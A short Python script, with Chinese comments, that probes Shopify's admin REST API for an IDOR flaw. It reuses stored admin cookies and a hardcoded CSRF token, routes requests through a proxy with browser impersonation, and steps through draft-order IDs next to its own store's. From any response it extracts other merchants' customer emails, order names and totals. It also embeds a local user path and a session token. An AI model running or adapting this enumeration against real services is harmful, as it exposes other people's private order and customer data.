# -*- coding: utf-8 -*-
"""REST 代理层按 ID GET 越权探测
自己店铺 handle + 相邻草稿订单 ID(GET 纯读)
如果返回别人订单数据(客户/地址/金额) -> REST 层 IDOR
"""
from curl_cffi import requests
import re

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg",
    "Sec-CH-UA": '"Chromium";v="138", "Google Chrome";v="138", "Not.A/Brand";v="99"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

def probe(resource, draft_id):
    url = f"https://admin.shopify.com/store/jqpkdm-kb/{resource}/{draft_id}.json"
    try:
        r = requests.get(url, headers=HEADERS, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
        txt = r.text
        if r.status_code == 200:
            # 提取订单关键字段
            m = re.search(r'"name":"([^"]+)"', txt) or re.search(r'"order_number":(\d+)', txt) or re.search(r'"id":(\d+)', txt)
            cust = re.search(r'"email":"([^"]+)"', txt)
            total = re.search(r'"total_price":"([^"]+)"', txt)
            print(f"[{resource} {draft_id}] HTTP 200 len={len(txt)} id={m.group(1) if m else '?'} email={cust.group(1) if cust else '-'} total={total.group(1) if total else '-'}")
            print(f"    BODY: {txt[:400]}")
        else:
            print(f"[{resource} {draft_id}] HTTP {r.status_code} | {txt[:100]}")
        return r
    except Exception as e:
        print(f"[{resource} {draft_id}] ERROR {e}")
        return None

if __name__ == "__main__":
    base = 1102015168554
    ids = [base] + [base + d for d in [-100, -10, -5, -2, -1, 1, 2, 5, 10, 100, 1000]]
    print("== draft_orders 按 ID GET ==")
    for i in ids:
        probe("draft_orders", i)
